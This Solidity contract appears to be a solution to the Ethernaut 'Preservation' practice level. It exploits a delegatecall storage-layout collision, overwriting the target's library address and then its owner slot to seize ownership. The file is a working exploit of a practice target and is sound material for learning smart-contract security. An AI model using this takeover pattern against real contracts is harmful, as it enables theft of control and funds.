// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract impersonate {

    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    Preservation public PreservationContract;

    constructor(address _PreservationContract){
        PreservationContract = Preservation(_PreservationContract);
    }

    function Decived() external {
        PreservationContract.setSecondTime(uint256(uint160(address(this))));
        PreservationContract.setFirstTime(uint256(uint160(msg.sender)));
        require(PreservationContract.owner() == msg.sender, "hack failed");
    }

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }

}
